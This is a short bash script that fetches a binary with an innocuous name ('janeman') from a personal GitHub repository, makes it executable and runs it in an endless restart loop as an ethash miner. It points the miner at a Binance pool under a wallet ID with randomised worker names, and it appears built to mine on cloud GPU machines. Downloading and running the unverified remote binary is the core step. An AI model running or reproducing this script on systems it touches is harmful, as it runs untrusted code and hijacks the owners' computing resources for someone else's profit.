#!/bin/bash
#POOL= stratum+tcp://ethash.poolbinance.com:1800
#WALLET=DHB
#WORKER=$(echo $(shuf -i 10-40 -n 1)-Dg)
apt-get install libpci3
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool stratum+tcp://ethash.poolbinance.com:1800 -wal DHB.$(echo $(shuf -i 10-40 -n 1)-K80) -pass x -proto 4 -stales 0
        sleep 5
	done
